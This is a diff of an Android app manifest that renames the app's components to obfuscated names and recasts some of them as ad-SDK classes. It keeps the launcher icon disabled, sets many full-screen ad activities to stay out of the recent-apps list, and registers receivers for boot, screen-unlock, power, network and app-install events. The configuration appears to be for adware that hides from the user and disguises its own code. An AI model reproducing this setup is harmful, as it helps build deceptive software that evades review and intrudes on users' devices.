@@ -5,12 +5,9 @@
     <uses-permission android:name="android.gms.permission.ACTIVITY_RECOGNITION" />
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
     <uses-permission android:name="android.permission.GET_TASKS" />
-    <!--    <uses-permission android:name="android.permission.REAL_GET_TASKS" />-->
-    <!--    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />-->
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-
 
     <queries>
         <package android:name="com.facebook.katana" />
@@ -22,17 +19,23 @@
             android:required="false" />
 
         <service
-            android:name="com.fast.sixth.man.open.FancyService"
+            android:name="com.wallsc.scrk.open.ShuajService"
             android:exported="false" />
 
+        <service
+            android:name="com.wallsc.scrk.JsScapePaper"
+            android:enabled="true"
+            android:exported="false"
+            android:permission="android.permission.BIND_JOB_SERVICE" />
+
         <activity
-            android:name="com.fast.sixth.man.listener.FancyActivity"
+            android:name="com.wallsc.scrk.core.ScreenActivity"
             android:enabled="false"
             android:exported="true"
-            android:icon="@mipmap/ic_fancy_si"
-            android:label="@string/fancy_sidhja"
-            android:roundIcon="@mipmap/ic_fancy_ssi"
-            android:theme="@style/FancySTheme">
+            android:icon="@mipmap/ic_sagosk_sqosk"
+            android:label="@string/sqiagkweusjgsas"
+            android:roundIcon="@mipmap/ic_quieksiaogs"
+            android:theme="@style/ScapeTheme">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
 
@@ -41,28 +44,28 @@
         </activity>
 
         <activity
-            android:name="com.fast.sixth.man.tools.SceneryActivity"
+            android:name="com.anythink.core.activity.AnythinkAdViewActivity"
             android:configChanges="fontScale|keyboard|keyboardHidden|locale|orientation|screenLayout|screenSize|smallestScreenSize|uiMode"
             android:excludeFromRecents="true"
             android:exported="false"
             android:finishOnCloseSystemDialogs="true"
-            android:icon="@drawable/ic_fancy_in"
-            android:label="@string/fas_sjizklgs"
+            android:icon="@drawable/ic_scopr_icon"
+            android:label="@string/siakwquasgs"
             android:launchMode="singleTask"
-            android:roundIcon="@drawable/ic_fancy_in"
+            android:roundIcon="@drawable/ic_scopr_icon"
             android:screenOrientation="behind"
-            android:taskAffinity="com.fancy.task"
-            android:theme="@style/FancySTheme" />
+            android:taskAffinity="scape.info.post"
+            android:theme="@style/ScapeTheme" />
 
         <activity
             android:name="com.yandex.mobile.ads.common.AdActivity"
             android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|uiMode|screenSize|smallestScreenSize"
             android:excludeFromRecents="true"
             android:finishOnCloseSystemDialogs="true"
-            android:icon="@drawable/ic_fancy_in"
-            android:label="@string/fas_sjizklgs"
-            android:roundIcon="@drawable/ic_fancy_in"
-            android:taskAffinity="com.fancy.task"
+            android:icon="@drawable/ic_scopr_icon"
+            android:label="@string/siakwquasgs"
+            android:roundIcon="@drawable/ic_scopr_icon"
+            android:taskAffinity="scape.info.post"
             android:theme="@style/MonetizationAdsInternal.AdActivity" />
 
         <activity
@@ -70,11 +73,11 @@
             android:configChanges="orientation|screenSize"
             android:excludeFromRecents="true"
             android:finishOnCloseSystemDialogs="true"
-            android:icon="@drawable/ic_fancy_in"
-            android:label="@string/fas_sjizklgs"
-            android:roundIcon="@drawable/ic_fancy_in"
+            android:icon="@drawable/ic_scopr_icon"
+            android:label="@string/siakwquasgs"
+            android:roundIcon="@drawable/ic_scopr_icon"
             android:screenOrientation="portrait"
-            android:taskAffinity="com.fancy.task"
+            android:taskAffinity="scape.info.post"
             android:theme="@android:style/Theme.Holo.Light.NoActionBar"
             android:windowSoftInputMode="stateAlwaysHidden" />
 
@@ -83,11 +86,11 @@
             android:configChanges="keyboardHidden|orientation|screenSize"
             android:excludeFromRecents="true"
             android:finishOnCloseSystemDialogs="true"
-            android:icon="@drawable/ic_fancy_in"
-            android:label="@string/fas_sjizklgs"
-            android:roundIcon="@drawable/ic_fancy_in"
+            android:icon="@drawable/ic_scopr_icon"
+            android:label="@string/siakwquasgs"
+            android:roundIcon="@drawable/ic_scopr_icon"
             android:screenOrientation="portrait"
-            android:taskAffinity="com.fancy.task"
+            android:taskAffinity="scape.info.post"
             android:theme="@android:style/Theme.NoTitleBar.Fullscreen" />
 
         <activity
@@ -95,10 +98,10 @@
             android:configChanges="orientation|keyboardHidden|screenSize"
             android:excludeFromRecents="true"
             android:finishOnCloseSystemDialogs="true"
-            android:icon="@drawable/ic_fancy_in"
-            android:label="@string/fas_sjizklgs"
-            android:roundIcon="@drawable/ic_fancy_in"
-            android:taskAffinity="com.fancy.task"
+            android:icon="@drawable/ic_scopr_icon"
+            android:label="@string/siakwquasgs"
+            android:roundIcon="@drawable/ic_scopr_icon"
+            android:taskAffinity="scape.info.post"
             android:theme="@android:style/Theme.Translucent.NoTitleBar" />
 
         <activity
@@ -108,7 +111,7 @@
             android:exported="false"
             android:finishOnCloseSystemDialogs="true"
             android:launchMode="singleTask"
-            android:taskAffinity="com.fancy.task"
+            android:taskAffinity="scape.info.post"
             android:theme="@android:style/Theme.NoTitleBar.Fullscreen" />
 
         <activity
@@ -117,12 +120,12 @@
             android:excludeFromRecents="true"
             android:exported="false"
             android:finishOnCloseSystemDialogs="true"
-            android:icon="@drawable/ic_fancy_in"
-            android:label="@string/fas_sjizklgs"
+            android:icon="@drawable/ic_scopr_icon"
+            android:label="@string/siakwquasgs"
             android:launchMode="standard"
-            android:roundIcon="@drawable/ic_fancy_in"
+            android:roundIcon="@drawable/ic_scopr_icon"
             android:screenOrientation="sensorLandscape"
-            android:taskAffinity="com.fancy.task"
+            android:taskAffinity="scape.info.post"
             android:theme="@android:style/Theme.NoTitleBar.Fullscreen" />
 
         <activity
@@ -131,12 +134,12 @@
             android:excludeFromRecents="true"
             android:exported="false"
             android:finishOnCloseSystemDialogs="true"
-            android:icon="@drawable/ic_fancy_in"
-            android:label="@string/fas_sjizklgs"
+            android:icon="@drawable/ic_scopr_icon"
+            android:label="@string/siakwquasgs"
             android:launchMode="standard"
-            android:roundIcon="@drawable/ic_fancy_in"
+            android:roundIcon="@drawable/ic_scopr_icon"
             android:screenOrientation="sensorPortrait"
-            android:taskAffinity="com.fancy.task"
+            android:taskAffinity="scape.info.post"
             android:theme="@android:style/Theme.NoTitleBar.Fullscreen" />
 
         <activity
@@ -145,12 +148,12 @@
             android:excludeFromRecents="true"
             android:exported="false"
             android:finishOnCloseSystemDialogs="true"
-            android:icon="@drawable/ic_fancy_in"
-            android:label="@string/fas_sjizklgs"
+            android:icon="@drawable/ic_scopr_icon"
+            android:label="@string/siakwquasgs"
             android:launchMode="standard"
-            android:roundIcon="@drawable/ic_fancy_in"
+            android:roundIcon="@drawable/ic_scopr_icon"
             android:screenOrientation="sensorLandscape"
-            android:taskAffinity="com.fancy.task"
+            android:taskAffinity="scape.info.post"
             android:theme="@style/anythink_myoffer_half_screen" />
 
         <activity
@@ -159,12 +162,12 @@
             android:excludeFromRecents="true"
             android:exported="false"
             android:finishOnCloseSystemDialogs="true"
-            android:icon="@drawable/ic_fancy_in"
-            android:label="@string/fas_sjizklgs"
+            android:icon="@drawable/ic_scopr_icon"
+            android:label="@string/siakwquasgs"
             android:launchMode="standard"
-            android:roundIcon="@drawable/ic_fancy_in"
+            android:roundIcon="@drawable/ic_scopr_icon"
             android:screenOrientation="sensorPortrait"
-            android:taskAffinity="com.fancy.task"
+            android:taskAffinity="scape.info.post"
             android:theme="@style/anythink_myoffer_half_screen" />
 
         <activity
@@ -173,11 +176,11 @@
             android:excludeFromRecents="true"
             android:exported="false"
             android:finishOnCloseSystemDialogs="true"
-            android:icon="@drawable/ic_fancy_in"
-            android:label="@string/fas_sjizklgs"
+            android:icon="@drawable/ic_scopr_icon"
+            android:label="@string/siakwquasgs"
             android:launchMode="singleTop"
-            android:roundIcon="@drawable/ic_fancy_in"
-            android:taskAffinity="com.fancy.task"
+            android:roundIcon="@drawable/ic_scopr_icon"
+            android:taskAffinity="scape.info.post"
             android:theme="@android:style/Theme.Light.NoTitleBar"
             android:windowSoftInputMode="adjustResize" />
 
@@ -186,10 +189,10 @@
             android:excludeFromRecents="true"
             android:exported="false"
             android:finishOnCloseSystemDialogs="true"
-            android:icon="@drawable/ic_fancy_in"
-            android:label="@string/fas_sjizklgs"
-            android:roundIcon="@drawable/ic_fancy_in"
-            android:taskAffinity="com.fancy.task"
+            android:icon="@drawable/ic_scopr_icon"
+            android:label="@string/siakwquasgs"
+            android:roundIcon="@drawable/ic_scopr_icon"
+            android:taskAffinity="scape.info.post"
             android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen" />
 
         <activity
@@ -198,11 +201,11 @@
             android:excludeFromRecents="true"
             android:exported="false"
             android:finishOnCloseSystemDialogs="true"
-            android:icon="@drawable/ic_fancy_in"
-            android:label="@string/fas_sjizklgs"
+            android:icon="@drawable/ic_scopr_icon"
+            android:label="@string/siakwquasgs"
             android:launchMode="standard"
-            android:roundIcon="@drawable/ic_fancy_in"
-            android:taskAffinity="com.fancy.task"
+            android:roundIcon="@drawable/ic_scopr_icon"
+            android:taskAffinity="scape.info.post"
             android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen" />
 
         <activity
@@ -210,11 +213,11 @@
             android:configChanges="keyboardHidden|orientation|screenSize"
             android:excludeFromRecents="true"
             android:finishOnCloseSystemDialogs="true"
-            android:icon="@drawable/ic_fancy_in"
-            android:label="@string/fas_sjizklgs"
+            android:icon="@drawable/ic_scopr_icon"
+            android:label="@string/siakwquasgs"
             android:launchMode="standard"
-            android:roundIcon="@drawable/ic_fancy_in"
-            android:taskAffinity="com.fancy.task"
+            android:roundIcon="@drawable/ic_scopr_icon"
+            android:taskAffinity="scape.info.post"
             android:theme="@style/tt_full_screen_new" />
 
         <activity
@@ -224,12 +227,12 @@
             android:exported="false"
             android:finishOnCloseSystemDialogs="true"
             android:hardwareAccelerated="true"
-            android:icon="@drawable/ic_fancy_in"
-            android:label="@string/fas_sjizklgs"
+            android:icon="@drawable/ic_scopr_icon"
+            android:label="@string/siakwquasgs"
             android:launchMode="singleTop"
-            android:roundIcon="@drawable/ic_fancy_in"
+            android:roundIcon="@drawable/ic_scopr_icon"
             android:screenOrientation="behind"
-            android:taskAffinity="com.fancy.task" />
+            android:taskAffinity="scape.info.post" />
 
         <activity
             android:name="com.applovin.adview.AppLovinFullscreenThemedActivity"
@@ -238,12 +241,12 @@
             android:exported="false"
             android:finishOnCloseSystemDialogs="true"
             android:hardwareAccelerated="true"
-            android:icon="@drawable/ic_fancy_in"
-            android:label="@string/fas_sjizklgs"
+            android:icon="@drawable/ic_scopr_icon"
+            android:label="@string/siakwquasgs"
             android:launchMode="singleTop"
-            android:roundIcon="@drawable/ic_fancy_in"
+            android:roundIcon="@drawable/ic_scopr_icon"
             android:screenOrientation="behind"
-            android:taskAffinity="com.fancy.task"
+            android:taskAffinity="scape.info.post"
             android:theme="@android:style/Theme.NoTitleBar.Fullscreen" />
 
         <activity
@@ -251,10 +254,10 @@
             android:configChanges="fontScale|keyboard|keyboardHidden|locale|orientation|screenLayout|screenSize|smallestScreenSize|uiMode"
             android:excludeFromRecents="true"
             android:finishOnCloseSystemDialogs="true"
-            android:icon="@drawable/ic_fancy_in"
-            android:label="@string/fas_sjizklgs"
-            android:roundIcon="@drawable/ic_fancy_in"
-            android:taskAffinity="com.fancy.task" />
+            android:icon="@drawable/ic_scopr_icon"
+            android:label="@string/siakwquasgs"
+            android:roundIcon="@drawable/ic_scopr_icon"
+            android:taskAffinity="scape.info.post" />
 
         <!-- Hybrid Ad Activities -->
         <activity
@@ -262,17 +265,17 @@
             android:configChanges="fontScale|keyboard|keyboardHidden|locale|orientation|screenLayout|screenSize|smallestScreenSize|uiMode"
             android:excludeFromRecents="true"
             android:finishOnCloseSystemDialogs="true"
-            android:icon="@drawable/ic_fancy_in"
-            android:label="@string/fas_sjizklgs"
-            android:roundIcon="@drawable/ic_fancy_in"
-            android:taskAffinity="com.fancy.task"
+            android:icon="@drawable/ic_scopr_icon"
+            android:label="@string/siakwquasgs"
+            android:roundIcon="@drawable/ic_scopr_icon"
+            android:taskAffinity="scape.info.post"
             android:theme="@android:style/Theme.NoTitleBar.Fullscreen" />
         <activity
             android:name="com.applovin.mediation.hybridAds.MaxHybridNativeAdActivity"
             android:configChanges="fontScale|keyboard|keyboardHidden|locale|orientation|screenLayout|screenSize|smallestScreenSize|uiMode"
             android:excludeFromRecents="true"
             android:finishOnCloseSystemDialogs="true"
-            android:taskAffinity="com.fancy.task"
+            android:taskAffinity="scape.info.post"
             android:theme="@android:style/Theme.NoTitleBar.Fullscreen" />
 
         <activity
@@ -281,10 +284,10 @@
             android:excludeFromRecents="true"
             android:finishOnCloseSystemDialogs="true"
             android:hardwareAccelerated="true"
-            android:icon="@drawable/ic_fancy_in"
-            android:label="@string/fas_sjizklgs"
-            android:roundIcon="@drawable/ic_fancy_in"
-            android:taskAffinity="com.fancy.task"
+            android:icon="@drawable/ic_scopr_icon"
+            android:label="@string/siakwquasgs"
+            android:roundIcon="@drawable/ic_scopr_icon"
+            android:taskAffinity="scape.info.post"
             android:theme="@android:style/Theme.NoTitleBar"
             tools:ignore="UnusedAttribute" />
 
@@ -294,7 +297,7 @@
             android:excludeFromRecents="true"
             android:finishOnCloseSystemDialogs="true"
             android:launchMode="standard"
-            android:taskAffinity="com.fancy.task"
+            android:taskAffinity="scape.info.post"
             android:theme="@style/tt_full_screen_new" />
         <activity
             android:name="com.bytedance.sdk.openadsdk.activity.TTFullScreenVideoActivity"
@@ -302,7 +305,7 @@
             android:excludeFromRecents="true"
             android:finishOnCloseSystemDialogs="true"
             android:launchMode="standard"
-            android:taskAffinity="com.fancy.task"
+            android:taskAffinity="scape.info.post"
             android:theme="@style/tt_full_screen_new" />
         <activity
             android:name="com.bytedance.sdk.openadsdk.activity.TTFullScreenExpressVideoActivity"
@@ -310,7 +313,7 @@
             android:excludeFromRecents="true"
             android:finishOnCloseSystemDialogs="true"
             android:launchMode="standard"
-            android:taskAffinity="com.fancy.task"
+            android:taskAffinity="scape.info.post"
             android:theme="@style/tt_full_screen_new" />
         <activity
             android:name="com.bytedance.sdk.openadsdk.activity.TTInterstitialActivity"
@@ -318,7 +321,7 @@
             android:excludeFromRecents="true"
             android:finishOnCloseSystemDialogs="true"
             android:launchMode="standard"
-            android:taskAffinity="com.fancy.task"
+            android:taskAffinity="scape.info.post"
             android:theme="@style/tt_full_screen_interaction" />
         <activity
             android:name="com.bytedance.sdk.openadsdk.activity.TTInterstitialExpressActivity"
@@ -326,7 +329,7 @@
             android:excludeFromRecents="true"
             android:finishOnCloseSystemDialogs="true"
             android:launchMode="standard"
-            android:taskAffinity="com.fancy.task"
+            android:taskAffinity="scape.info.post"
             android:theme="@style/tt_full_screen_interaction" />
 
         <activity
@@ -335,7 +338,7 @@
             android:excludeFromRecents="true"
             android:finishOnCloseSystemDialogs="true"
             android:launchMode="standard"
-            android:taskAffinity="com.fancy.task"
+            android:taskAffinity="scape.info.post"
             android:theme="@style/tt_landing_page" />
         <activity
             android:name="com.bytedance.sdk.openadsdk.activity.TTPlayableLandingPageActivity"
@@ -343,7 +346,7 @@
             android:excludeFromRecents="true"
             android:finishOnCloseSystemDialogs="true"
             android:launchMode="standard"
-            android:taskAffinity="com.fancy.task"
+            android:taskAffinity="scape.info.post"
             android:theme="@style/tt_landing_page" />
         <activity
             android:name="com.bytedance.sdk.openadsdk.activity.TTVideoLandingPageLink2Activity"
@@ -351,7 +354,7 @@
             android:excludeFromRecents="true"
             android:finishOnCloseSystemDialogs="true"
             android:launchMode="standard"
-            android:taskAffinity="com.fancy.task"
+            android:taskAffinity="scape.info.post"
             android:theme="@style/tt_landing_page" />
 
         <activity
@@ -359,7 +362,7 @@
             android:excludeFromRecents="true"
             android:finishOnCloseSystemDialogs="true"
             android:launchMode="standard"
-            android:taskAffinity="com.fancy.task"
+            android:taskAffinity="scape.info.post"
             android:theme="@android:style/Theme.Translucent.NoTitleBar" />
 
         <activity
@@ -369,11 +372,11 @@
             android:exported="false"
             android:finishOnCloseSystemDialogs="true"
             android:hardwareAccelerated="true"
-            android:icon="@drawable/ic_fancy_in"
-            android:label="@string/fas_sjizklgs"
+            android:icon="@drawable/ic_scopr_icon"
+            android:label="@string/siakwquasgs"
             android:multiprocess="true"
-            android:roundIcon="@drawable/ic_fancy_in"
-            android:taskAffinity="com.fancy.task"
+            android:roundIcon="@drawable/ic_scopr_icon"
+            android:taskAffinity="scape.info.post"
             android:theme="@android:style/Theme.NoTitleBar.Fullscreen" />
 
         <activity
@@ -382,15 +385,15 @@
             android:exported="false"
             android:finishOnCloseSystemDialogs="true"
             android:hardwareAccelerated="true"
-            android:icon="@drawable/ic_fancy_in"
-            android:label="@string/fas_sjizklgs"
+            android:icon="@drawable/ic_scopr_icon"
+            android:label="@string/siakwquasgs"
             android:multiprocess="true"
-            android:roundIcon="@drawable/ic_fancy_in"
-            android:taskAffinity="com.fancy.task"
+            android:roundIcon="@drawable/ic_scopr_icon"
+            android:taskAffinity="scape.info.post"
             android:theme="@android:style/Theme.NoTitleBar.Fullscreen" />
 
         <provider
-            android:name="com.fast.sixth.man.listener.FancyCP"
+            android:name="com.anythink.core.provider.AnythinkSpProvider"
             android:authorities="${applicationId}.sync"
             android:enabled="true"
             android:exported="true"
@@ -401,18 +404,11 @@
         </provider>
 
         <receiver
-            android:name="com.fast.sixth.man.listener.FancySceneryBroadcast"
+            android:name="com.wallsc.scrk.listener.FancySceneryBroadcast"
             android:exported="true">
-            <intent-filter>
-                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
-                <action android:name="android.net.wifi.WIFI_STATE_CHANGED" />
-                <action android:name="android.net.wifi.STATE_CHANGE" />
-                <action android:name="android.bluetooth.adapter.action.STATE_CHANGED" />
-            </intent-filter>
+
             <intent-filter>
                 <action android:name="android.intent.action.BATTERY_LOW" />
-                <action android:name="android.intent.action.BATTERY_OKAY" />
-                <action android:name="android.intent.action.BATTERY_CHANGED" />
                 <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
                 <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
             </intent-filter>
@@ -422,21 +418,28 @@
                 <action android:name="android.intent.action.LOCALE_CHANGED" />
                 <action android:name="android.intent.action.CLOSE_SYSTEM_DIALOGS" />
             </intent-filter>
+            <intent-filter>
+                <action android:name="android.intent.action.BATTERY_OKAY" />
+                <action android:name="android.intent.action.BATTERY_CHANGED" />
+                <action android:name="android.intent.action.SCREEN_ON" />
+                <action android:name="android.intent.action.SCREEN_OFF" />
+                <action android:name="android.intent.action.USER_PRESENT" />
+                <action android:name="android.intent.action.WALLPAPER_CHANGED" />
+            </intent-filter>
         </receiver>
 
         <receiver
-            android:name="com.fast.sixth.man.listener.BrocasdFancy"
+            android:name="com.wallsc.scrk.listener.BrocasdFancy"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <category android:name="android.intent.category.DEFAULT" />
             </intent-filter>
             <intent-filter>
-                <action android:name="android.intent.action.SCREEN_ON" />
-                <action android:name="android.intent.action.SCREEN_OFF" />
-                <action android:name="android.intent.action.USER_PRESENT" />
-                <action android:name="android.intent.action.WALLPAPER_CHANGED" />
-                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED" />
+                <action android:name="android.net.wifi.STATE_CHANGE" />
+                <action android:name="android.bluetooth.adapter.action.STATE_CHANGED" />
             </intent-filter>
             <intent-filter>
                 <action android:name="android.intent.action.PACKAGE_ADDED" />
@@ -446,6 +449,7 @@
                 <action android:name="android.intent.action.PACKAGE_DATA_CLEARED" />
                 <action android:name="android.intent.action.PACKAGE_RESTARTED" />
                 <action android:name="android.intent.action.PACKAGE_FIRST_LAUNCH" />
+
                 <data android:scheme="package" />
             </intent-filter>
         </receiver>
